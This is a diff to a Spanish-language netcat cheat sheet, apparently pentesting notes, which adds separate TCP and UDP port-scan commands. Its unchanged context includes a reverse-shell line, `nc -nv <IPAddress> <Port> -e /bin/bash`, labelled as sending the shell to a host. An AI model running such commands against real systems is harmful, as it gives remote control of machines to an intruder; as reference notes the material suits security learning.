@@ -40,9 +40,13 @@
 
 - `nc -nv <IPAddress> <Port> -e /bin/bash`: Conexión al host y mandamos la shell.
 
-#### Escanear Puertos
+#### Escanear Puertos TCP
 
-- `nc -vz <IPAddress> <Port-Range>`: Escanear la IP del host con el rango de puertos.
+- `nc -nvz <IPAddress> <Port-Range>`: Escanear la IP del host con el rango de puertos.
+
+#### Escanear Puertos UDP
+
+- `nc -nvzu <IPAddress> <Port-Range>`: Escanear la IP del host con el rango de puertos.
 
 #### Banner Grabbing
 
